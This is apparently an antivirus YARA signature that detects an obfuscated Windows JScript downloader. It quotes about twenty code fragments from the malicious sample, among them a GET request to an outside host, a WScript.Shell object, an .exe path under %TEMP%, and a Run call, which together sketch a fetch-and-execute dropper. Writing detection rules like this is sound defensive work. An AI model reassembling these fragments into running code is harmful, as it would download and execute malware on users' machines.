rule sig_20160330_c59d4ffa891963f7b9499c0995d114ac {
  meta:
    description = "datamaliciousorder - file 20160330_c59d4ffa891963f7b9499c0995d114ac.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1c482e487f4d8524382662c7bb3592b84612562cd767dd445c4f9800de862511"

  strings:
    $s1  = "_J0[_BN](\"GET\", \"http://hollandfoodexchange.com/d7jsa\", false);" fullword ascii
    $s2  = "function _PD(_Q, _D){_WU = _WU * 1; return _Q - _D;};" fullword ascii
    $s3  = "var _J = function _NZ() {return WScript[_C0](\"WScript\"+\".Shell\");}(), _WG = 11;" fullword ascii
    $s4  = "if (_J0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _KB() {return _J[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"cLwVbH9GgJ.ex\" + \"e\";};" fullword ascii
    $s6  = "function _JL(){return _O0 + \"\";};" fullword ascii
    $s7  = "function _HS(_GQ){_J[\"Run\"](_GQ, _WU, _WU);};" fullword ascii
    $s8  = "function _O() {return ((_Y0 == true) && (_Y0 == _VO)) ? 1 : _WU;};" fullword ascii
    $s9  = "function _R()" fullword ascii
    $s10 = " while (_KV){" fullword ascii
    $s11 = "var _C1 = new this[\"Date\"]();" fullword ascii
    $s12 = "function _Y(){return _C0;};" fullword ascii
    $s13 = "function _FD(){return 22;};" fullword ascii
    $s14 = "function _P(_C) {var _S = (1, 2, 3, 4, 5, _C); return _S;};" fullword ascii
    $s15 = "return _PD(_FR, _AE);" fullword ascii
    $s16 = "var _Y0 = false;" fullword ascii
    $s17 = "_Y0 = true; " fullword ascii
    $s18 = "var _ST = false;" fullword ascii
    $s19 = "_VO = true; " fullword ascii
    $s20 = "var _VO = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}